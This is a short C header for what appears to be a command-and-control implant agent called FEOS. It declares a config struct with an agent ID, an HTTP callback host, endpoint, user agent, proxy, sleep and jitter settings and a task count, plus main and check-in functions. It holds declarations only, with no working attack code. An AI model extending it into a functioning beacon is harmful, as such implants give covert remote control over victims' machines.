#pragma once
#ifndef FEOS_H
#define FEOS_H



#include <windows.h>
#include "Command.h"
#include "Package.h"

#include "Parser.h"
#include "Utils.h"
#include "Checkin.h"


typedef struct
{
	// UUID
	PCHAR agentID;

	// HTTP 
	PWCHAR hostName;
	DWORD httpPort;
	PWCHAR endPoint;
	PWCHAR userAgent;
	PWCHAR httpMethod;

	BOOL isSSL;
	BOOL isProxyEnabled;
	PWCHAR proxyURL;

	UINT32 sleeptime_ms;
	UINT32 jitter;

	UINT32 numTasks;

} CONFIG_FEOS, * PCONFIG_FEOS;

extern PCONFIG_FEOS feosConfig;


VOID setUUID(PCHAR newUUID);
VOID freeFeosConfig();
VOID feosMain();

#endif
